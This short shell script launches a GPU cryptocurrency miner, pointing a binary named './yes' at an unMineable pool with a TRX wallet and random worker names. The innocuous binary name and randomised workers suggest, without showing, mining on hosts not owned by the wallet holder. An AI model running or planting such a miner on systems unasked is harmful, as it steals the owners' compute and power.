POOL=rx-us.unmineable.com:3333
WALLET=TRX:TY6BidXEtkYCfzuNBmiVbh78svKX5jRMGh
GPU=$(nvidia-smi --query-gpu=gpu_name --format=csv > nvidia.txt && echo "$(tail -n +2 "nvidia.txt")" > "nvidia.txt" && str=$(cat nvidia.txt) && echo ${str// /_})
WORKER=$(echo K2vHmhLB-$(shuf -i 1911-378567 -n 1))
ALGO=wrkzcoin
./yes --pool $POOL --username $WALLET.$WORKER --password x --algorithm $ALGO --disableCPU
